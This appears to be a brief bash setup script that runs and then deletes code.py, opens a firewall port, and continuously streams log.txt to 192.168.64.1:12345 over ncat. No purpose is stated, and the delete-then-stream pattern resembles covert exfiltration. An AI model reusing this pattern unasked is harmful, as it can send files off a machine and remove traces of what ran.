#!/bin/bash
sudo apt-get update
sudo apt-get install -y python3-pip
sudo pip install -r requirements.txt
python3 -u code.py
sudo rm code.py
sudo apt-get update
sudo apt-get install -y ncat
sudo apt-get install -y ufw
sudo ufw enable
sudo ufw allow 12345/tcp

while true; do
    tail -f log.txt | ncat 192.168.64.1 12345
    sleep 1
done
